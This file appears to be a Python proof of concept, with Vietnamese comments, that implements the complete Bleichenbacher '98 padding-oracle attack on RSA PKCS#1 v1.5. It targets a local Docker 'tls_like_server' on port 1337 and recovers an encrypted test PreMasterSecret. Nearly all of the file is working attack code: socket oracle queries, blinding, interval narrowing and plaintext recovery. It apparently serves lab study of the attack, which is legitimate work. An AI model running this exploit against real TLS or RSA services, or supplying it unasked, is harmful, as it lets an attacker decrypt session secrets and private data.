import socket
import sys
import os
import logging
from random import randrange
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Random import get_random_bytes

# --- 1. CÁC HÀM TIỆN ÍCH (Từ script của bạn) ---
# Script của bạn import 'ceil_div' và 'floor_div' từ 'shared'
# Chúng ta sẽ định nghĩa chúng ở đây cho tiện
def ceil_div(a, b):
    """Tính (a / b) làm tròn lên"""
    return (a + b - 1) // b

def floor_div(a, b):
    """Tính (a / b) làm tròn xuống"""
    return a // b

def _insert(M, a, b):
    """Hợp nhất các khoảng (intervals)"""
    for i, (a_, b_) in enumerate(M):
        # Nếu khoảng mới (a, b) giao/chồng lấn với khoảng cũ (a_, b_)
        if a_ <= b and a <= b_:
            a = min(a, a_)
            b = max(b, b_)
            M[i] = (a, b)
            return

    # Nếu không có chồng lấn, thêm làm khoảng mới
    M.append((a, b))
    return

# --- 2. LOGIC TẤN CÔNG (Từ script của bạn) ---
# Đây là toàn bộ thuật toán Bleichenbacher '98
# (Các bước này được mô tả trong bleichenbacher98.pdf [cite: 930])

# Step 1. Blinding
def _step_1(padding_oracle, n, e, c):
    s0 = 1
    c0 = c
    logging.info("Step 1: Blinding - Đang tìm bản tin PKCS conforming đầu tiên...")
    i = 0
    while not padding_oracle(c0):
        i += 1
        if i % 100 == 0:
            logging.info(f"Step 1: Blinding attempt {i}...")
        s0 = randrange(2, n)
        c0 = (c * pow(s0, e, n)) % n
    
    logging.info(f"Step 1: Blinding thành công sau {i+1} lần thử. s0 = {s0}")
    return s0, c0

# Step 2.a. Searching
def _step_2a(padding_oracle, n, e, c0, B):
    s = ceil_div(n, 3 * B)
    logging.info(f"Step 2.a: Bắt đầu tìm kiếm s1 >= {s}")
    while not padding_oracle((c0 * pow(s, e, n)) % n):
        s += 1
    logging.info(f"Step 2.a: Tìm thấy s1 = {s}")
    return s

# Step 2.b. Searching with more than one interval
def _step_2b(padding_oracle, n, e, c0, s):
    s += 1
    logging.info(f"Step 2.b: Đang tìm kiếm từ s = {s}")
    while not padding_oracle((c0 * pow(s, e, n)) % n):
        s += 1
    logging.info(f"Step 2.b: Tìm thấy s = {s}")
    return s

# Step 2.c. Searching with one interval left
def _step_2c(padding_oracle, n, e, c0, B, s, a, b):
    r = ceil_div(2 * (b * s - 2 * B), n)
    logging.info(f"Step 2.c: Bắt đầu tìm kiếm với r = {r}")
    while True:
        left = ceil_div(2 * B + r * n, b)
        right = floor_div(3 * B + r * n, a)
        for s_new in range(left, right + 1):
            if padding_oracle((c0 * pow(s_new, e, n)) % n):
                logging.info(f"Step 2.c: Tìm thấy s = {s_new}")
                return s_new
        r += 1

# Step 3. Narrowing the set of solutions
def _step_3(n, B, s, M):
    M_ = []
    logging.debug(f"Step 3: Thu hẹp {len(M)} khoảng với s = {s}")
    for (a, b) in M:
        left = ceil_div(a * s - 3 * B + 1, n)
        right = floor_div(b * s - 2 * B, n)
        for r in range(left, right + 1):
            a_ = max(a, ceil_div(2 * B + r * n, s))
            b_ = min(b, floor_div(3 * B - 1 + r * n, s))
            if a_ <= b_:
                _insert(M_, a_, b_)
    logging.debug(f"Step 3: Các khoảng mới: {M_}")
    return M_

# Hàm attack chính từ script của bạn
def attack(padding_oracle, n, e, c):
    k = ceil_div(n.bit_length(), 8)
    B = 2 ** (8 * (k - 2))
    logging.info(f"k = {k} bytes, B = {B}")

    # Step 1
    s0, c0 = _step_1(padding_oracle, n, e, c)
    M = [(2 * B, 3 * B - 1)]

    # Step 2.a
    s = _step_2a(padding_oracle, n, e, c0, B)
    M = _step_3(n, B, s, M)
    i = 1
    while True:
        logging.info(f"--- Vòng lặp {i}, {len(M)} khoảng ---")
        if len(M) > 1:
            # Step 2.b
            s = _step_2b(padding_oracle, n, e, c0, s)
        else:
            (a, b) = M[0]
            if a == b:
                # Step 4. Computing the solution
                logging.info("Step 4: Đã tìm thấy giải pháp!")
                m = (a * pow(s0, -1, n)) % n
                return m
            # Step 2.c
            s = _step_2c(padding_oracle, n, e, c0, B, s, a, b)
        
        # Step 3
        M = _step_3(n, B, s, M)
        i += 1

# --- 3. LOGIC KẾT NỐI (Phần "tay chân") ---

# Hàm này thực hiện việc "hỏi" oracle qua socket
def query_oracle(ciphertext_int, host, port, n_length_bytes):
    # Chuyển số nguyên về bytes, đảm bảo đúng độ dài
    c_bytes = ciphertext_int.to_bytes(n_length_bytes, 'big')
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host, port))
            s.sendall(c_bytes)
            response = s.recv(1024)
            # Trả về True nếu server nói "OK"
            return response == b'OK'
        except ConnectionRefusedError:
            logging.error("Lỗi: Không thể kết nối. Server oracle đã chạy chưa?")
            sys.exit(1)
        except Exception as e:
            # logging.error(f"Lỗi socket: {e}")
            return False

# --- 4. HÀM MAIN ĐỂ CHẠY MỌI THỨ ---
if __name__ == "__main__":
    # Cấu hình logging để xem tiến trình
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # --- Tải Public Key ---
    PUB_KEY_PATH = "poc/Bleichenbacher/public.pem"
    try:
        pub_key = RSA.import_key(open(PUB_KEY_PATH).read())
    except FileNotFoundError:
        logging.error(f"Lỗi: Không tìm thấy public key tại '{PUB_KEY_PATH}'")
        logging.error("Bạn đã chạy server (docker/tls_like_server/server.py) để tạo key chưa?")
        sys.exit(1)

    n = pub_key.n
    e = pub_key.e
    k = ceil_div(n.bit_length(), 8) # Độ dài key (bytes)

    # --- Tạo một bản tin để giải mã ---
    # Đây là "PreMasterSecret" trong PoC của bạn [cite: 1215]
    plaintext = b'Day la PreMasterSecret bi mat (48B)' + b'!' * 13
    assert len(plaintext) == 48

    cipher_rsa = PKCS1_v1_5.new(pub_key)
    c_bytes = cipher_rsa.encrypt(plaintext)
    c_int = int.from_bytes(c_bytes, 'big') # Chuyển ciphertext sang số nguyên
    logging.info(f"Đã tạo bản tin (ciphertext).")

    # --- Chuẩn bị Oracle ---
    import os
    HOST = os.getenv("ORACLE_HOST", "tls_like_server")   # default to compose service name
    PORT = int(os.getenv("ORACLE_PORT", "1337"))


    # Tạo một hàm wrapper (adapter) để logic 'attack' (bộ não)
    # có thể gọi hàm 'query_oracle' (tay chân)
    # mà không cần biết về HOST/PORT.
    def oracle_wrapper(c_int_to_test):
        return query_oracle(c_int_to_test, HOST, PORT, k)

    # --- BẮT ĐẦU TẤN CÔNG ---
    logging.info("Bắt đầu cuộc tấn công Bleichenbacher đầy đủ...")
    
    # Chạy thuật toán!
    m_int = attack(oracle_wrapper, n, e, c_int)

    # --- Hiển thị kết quả ---
    logging.info("\n--- TẤN CÔNG THÀNH CÔNG! ---")
    
    # Chuyển đổi plaintext từ số nguyên về bytes
    m_bytes = m_int.to_bytes(k, 'big')
    
    # Thử tìm và in phần plaintext (loại bỏ padding PKCS#1)
    try:
        # Tìm vị trí byte 0x00 phân tách (sau 00 02...)
        separator_idx = m_bytes.index(b'\x00', 2) 
        recovered_plaintext = m_bytes[separator_idx + 1:]
        
        logging.info(f"Bản tin gốc (để so sánh): {plaintext}")
        logging.info(f"Bản tin phục hồi (UTF-8): {recovered_plaintext.decode('utf-8')}")

        # Xác minh
        assert recovered_plaintext == plaintext
        logging.info("Xác minh: Thành công! Bản tin phục hồi khớp với bản tin gốc.")
        
    except (ValueError, UnicodeDecodeError) as e:
        logging.error(f"Không thể giải mã/tìm thấy plaintext từ bytes: {e}")
        logging.warning(f"Plaintext (dạng số): {m_int}")
        logging.warning(f"Plaintext (dạng bytes thô): {m_bytes.hex()}")